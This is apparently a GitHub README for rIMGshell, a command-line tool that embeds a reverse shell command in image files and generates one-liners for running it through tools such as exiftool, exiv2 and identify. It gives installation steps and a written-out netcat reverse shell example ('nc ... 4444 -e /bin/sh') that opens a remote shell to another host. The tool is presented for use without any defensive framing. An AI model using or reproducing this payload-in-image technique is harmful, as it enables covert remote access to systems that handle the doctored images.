# rIMGshell

<img src="https://github.com/git5loxosec/rIMGshell/blob/main/Screenshot_2023-09-22_20_08_14.png">
```
# rIMGshell

![GitHub](https://img.shields.io/github/license/git5loxosec/rIMGshell)

rIMGshell is a command-line tool for injecting a reverse shell command into an image and generating one-liner execution methods to exploit it.

## Features

- Inject reverse shell commands into image files.
- Generate one-liner execution methods for various tools.
- Choose from multiple one-liner execution methods.

## Installation

1. Clone the repository:

   ```
   git clone https://github.com/git5loxosec/rIMGshell.git
   ```

2. Change to the project directory:

   ```
   cd rIMGshell
   ```

3. Make the script executable:

   ```
   chmod +x rIMGshell.sh
   ```

## Usage

```
./rIMGshell.sh [OPTIONS] <REVERSE_SHELL_COMMAND> <IMAGE_FILENAME>
```

- `[OPTIONS]` - Optional arguments.
- `<REVERSE_SHELL_COMMAND>` - The reverse shell command to inject.
- `<IMAGE_FILENAME>` - The name of the image file.

**Example:**

```
./rIMGshell.sh "nc 192.168.1.128 4444 -e /bin/sh" image.jpg
```

## One-Liner Execution Methods

- **exiftool-one-liner:** Injected image can be executed with exiftool.
- **exiv2-one-liner:** Injected image can be executed with exiv2.
- **identify-one-liner:** Injected image can be executed with identify.
- **file-grep-one-liner:** Injected image can be executed with file and grep.
- **jpeginfo-grep-one-liner:** Injected image can be executed with jpeginfo and grep.

## Contributing

Contributions are welcome! Please fork the repository and submit a pull request.

## License

This project is licensed under the [MIT License](LICENSE).
```
